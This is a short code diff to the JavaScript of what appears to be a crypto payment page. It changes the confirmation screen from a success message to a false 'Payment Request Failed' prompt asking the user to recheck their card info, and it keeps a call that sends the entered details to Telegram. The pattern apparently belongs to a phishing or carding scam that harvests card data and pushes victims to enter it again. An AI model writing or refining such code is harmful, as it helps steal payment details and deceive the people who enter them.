@@ -190,13 +190,11 @@ function confirmPayment() {
     setTimeout(() => {
         document.querySelector(".loader").style.display = "none"; // Hide loader
         document.getElementById("paymentStatus").innerHTML = `
-            <div class="checkmark">✔</div>
-            <h2>Payment Request Sent Successfully</h2>
+            <div class="checkmark">!</div>
+            <h2>Payment Request Failed. please check if the card info is correct and try again.</h2>
             <p>Crypto: ${document.getElementById("crypto").value}</p>
             <p>Wallet: ${document.getElementById("walletAddress").value}</p>
             <p>Amount: ${document.getElementById("amount").value}</p>
-            <p>Service Fee: 25%</p>
-            <p>You will receive your order in an hour.</p>
         `;
 
         sendToTelegram(); // Send details after confirmation
